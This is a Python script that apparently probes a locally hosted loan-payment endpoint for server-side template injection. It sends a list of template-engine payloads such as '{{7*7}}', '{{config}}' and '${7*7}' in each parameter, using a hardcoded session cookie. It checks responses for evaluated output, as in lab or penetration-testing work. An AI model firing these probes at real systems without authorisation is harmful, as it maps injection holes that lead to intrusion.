import requests
import json
import urllib.parse

# Base URL for the endpoint
base_url = "http://127.0.0.1:5000"

# Session cookie from authentication
cookies = {
    'session': 'eyJ1c2VyX2lkIjoxfQ.aVtEcw.vtxsg2V0gHHl7Kfzqp8OUXiB9rs'
}

print("="*80)
print("SSTI ENDPOINT ANALYSIS: /total_loan_payments")
print("="*80)
print()

# Test 1: Baseline request with legitimate parameters
print("[TEST 1] Baseline request with legitimate loan parameters")
print("-" * 80)
params1 = {
    'principal': '10000',
    'payment': '212.47',
    'term': '60'
}

try:
    response1 = requests.get(
        f"{base_url}/total_loan_payments",
        params=params1,
        cookies=cookies,
        timeout=10
    )
    
    print(f"URL: {response1.url}")
    print(f"Status Code: {response1.status_code}")
    print(f"Content-Type: {response1.headers.get('Content-Type', 'NOT SET')}")
    print(f"Content Length: {len(response1.content)} bytes")
    print()
    print(f"Response Headers: {dict(response1.headers)}")
    print()
    print(f"Response Body (Raw):\n{response1.text}")
    print()
    
    # Try to parse as JSON
    try:
        json_data = response1.json()
        print(f"Parsed JSON:\n{json.dumps(json_data, indent=2)}")
    except:
        print("[NOTE] Response could not be parsed as JSON (this is suspicious)")
    print()
    
except Exception as e:
    print(f"[ERROR] Request failed: {e}")
print()

# Test 2: SSTI Probes - Test basic template injection patterns
print("[TEST 2] SSTI Probe Testing")
print("-" * 80)

# Common template engine probes 
ssti_probes = [
    # Jinja2 style
    ('{{7*7}}', 'Jinja2 basic math'),
    ('{{7*"7"}}', 'Jinja2 string multiplication'),
    ('{{config}}', 'Jinja2 config object'),
    ('{{request.application}}', 'Jinja2 request object'),
    
    # Mako style  
    ('${7*7}', 'Mako basic math'),
    ('<% 7*7 %>', 'Mako expression'),
    
    # ERB/Ruby style
    ('<%= 7*7 %>', 'ERB expression'),
    ('${{7*7}}', 'Double bracket'),
    
    # Java/Velocity style
    ('${7*7}', 'Velocity/EL expression'),
    ('#{7*7}', 'OGNL/SpEL expression'),
    
    # Twig style
    ('{{7*7}}', 'Twig basic math (same as Jinja2)'),
    ('{{"7"*"7"}}', 'Twig string operation'),
    
    # Freemarker style
    ('${7*7}', 'Freemarker expression'),
    ('#{7*7}', 'Freemarker old syntax'),
    
    # DotCMS style
    ('$!{7*7}', 'DotCMS expression'),
]

for probe, description in ssti_probes:
    print(f"Testing: {description}")
    print(f"Payload: {probe}")
    
    # Test each probe in each parameter
    for param_name in ['principal', 'payment', 'term']:
        try:
            params_test = {p: '10000' for p in ['principal', 'payment', 'term']}
            params_test[param_name] = probe
            
            response = requests.get(
                f"{base_url}/total_loan_payments",
                params=params_test,
                cookies=cookies,
                timeout=10
            )
            
            # Check if probe is reflected or evaluated
            if str(49) in response.text:  # 7*7 = 49
                print(f"  [ALERT] Evaluated in '{param_name}'! Response contains '49'")
                print(f"  Response snippet: {response.text[:200]}")
            elif probe in response.text:
                print(f"  [INFO] Reflected (not evaluated) in '{param_name}'")
            else:
                print(f"  [INFO] Not reflected in '{param_name}'")
                
        except Exception as e:
            print(f"  [ERROR] Test failed: {e}")
    print()

print("="*80)
print("ANALYSIS COMPLETE")
print("="*80)
